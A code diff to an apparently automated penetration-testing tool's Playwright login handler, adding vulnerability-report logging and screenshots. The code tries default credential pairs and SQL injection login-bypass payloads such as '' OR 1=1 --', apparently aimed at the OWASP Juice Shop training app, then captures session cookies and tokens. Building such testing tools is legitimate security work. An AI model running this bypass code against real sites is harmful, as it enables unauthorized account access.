@@ -3,10 +3,12 @@ import asyncio
 import json
 from playwright.async_api import Page, BrowserContext
 from src.core.logger import setup_logger
+from src.utils.pen_test_log_builder import VulnerabilityBuilder
 
 class AuthHandler:
     def __init__(self, logger=None):
         self.logger = logger or setup_logger("AuthHandler")
+        self.report_builder = VulnerabilityBuilder()
         self.cookies = None
         self.auth_token = None
         self.default_creds = [
@@ -14,6 +16,7 @@ class AuthHandler:
             ("root", "root"), ("user", "user"),
             ("admin", "admin123"), ("admin", "123456")
         ]
+        self.collected_findings = []
 
     async def find_and_login(self, page: Page, creds: dict) -> bool:
         """[ASYNC] ตรวจหาฟอร์มและพยายาม Login"""
@@ -76,25 +79,29 @@ class AuthHandler:
     async def _try_sqli_bypass(self, page: Page) -> bool:
         payloads = ["admin@juice-sh.op'--", "' OR 1=1 --"]
         
-        # Generic Selectors: ใช้ Attribute ที่เว็บส่วนใหญ่ชอบใช้
-        user_selectors = 'input[type="email"], input[name*="user"], input[name*="email"], input#email, input.email'
+        user_selectors = 'input[type="email"], input[name*="user"], input[name*="email"], input#email'
         pass_selectors = 'input[type="password"], input[name*="pass"]'
-        submit_selectors = 'button[type="submit"], button#loginButton, button:has-text("Log in"), button:has-text("Login")'
+        submit_selectors = 'button[type="submit"], button#loginButton, button:has-text("Login")'
 
         for payload in payloads:
             try:
+                # 1. จัดการ Modal หรือ Pop-up ก่อนเริ่ม
                 await self._dismiss_initial_modals(page)
                 
-                # แทนที่จะระบุ URL ตายตัว ให้หาลิงก์ที่มีคำว่า Login ในหน้าปัจจุบันก่อน
-                # ถ้าไม่เจอค่อยลองเดา path /login
+                # 2. เก็บ URL ของหน้า Login ไว้ทำรายงาน
+                current_login_url = page.url 
+
+                # 3. หาทางเข้าหน้า Login (ถ้ายังไม่อยู่ในหน้านั้น)
                 if "login" not in page.url.lower():
                     login_link = page.locator('a:has-text("Login"), a:has-text("Sign in")').first
                     if await login_link.is_visible():
                         await login_link.click()
+                        await page.wait_for_load_state("networkidle")
                     else:
+                        # ถ้าหาลิงก์ไม่เจอ ให้ลองเดา Path (เฉพาะ Juice Shop หรือ Next.js)
                         await page.goto(f"{page.url.split('#')[0]}#/login", wait_until="networkidle")
 
-                # ใช้ .first เพื่อเอาอันแรกที่แมตช์กับ Generic Selectors
+                # 4. ระบุ Element
                 user_input = page.locator(user_selectors).first
                 pass_input = page.locator(pass_selectors).first
                 submit_btn = page.locator(submit_selectors).first
@@ -105,10 +112,42 @@ class AuthHandler:
                     await submit_btn.click()
                     
                     await page.wait_for_timeout(2000)
+
+                    # 5. ตรวจสอบว่า Login สำเร็จหรือไม่
                     if await self._check_success(page):
+                        self.logger.info(f"✅ SQLi Bypass Success with payload: {payload}")
+                        
+                        # เก็บ Session ข้อมูลคุกกี้/Token
                         await self._capture_session(page)
-                        return True
-            except: continue
+
+                        # --- [เพิ่มจุดที่ต้องแก้: บันทึก Finding] ---
+                        
+                        # ถ่ายภาพหลักฐาน (Screenshot)
+                        import base64
+                        screenshot_bytes = await page.screenshot(type="jpeg", quality=70)
+                        screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
+
+                        # สร้าง Finding รายงานผล
+                        auth_finding = self.report_builder.build(
+                            url=current_login_url, 
+                            param="username", 
+                            vuln_type="Authentication Bypass via SQL Injection",
+                            payload=payload, 
+                            screenshot=screenshot_b64, 
+                            details=f"Successfully bypassed authentication using payload: {payload}. This allows unauthorized access to user accounts.",
+                            method="POST",
+                            severity="CRITICAL" 
+                        )
+                        
+                        # ตรวจสอบว่า collected_findings มีการประกาศไว้ใน __init__ หรือยัง
+                        if hasattr(self, 'collected_findings'):
+                            self.collected_findings.append(auth_finding)
+                        
+                        return True # หยุดการลอง payload อื่นเมื่อสำเร็จ
+                        
+            except Exception as e:
+                self.logger.error(f"[-] Error during SQLi Bypass attempt: {e}")
+                continue
         return False
 
     async def _capture_session(self, page: Page):
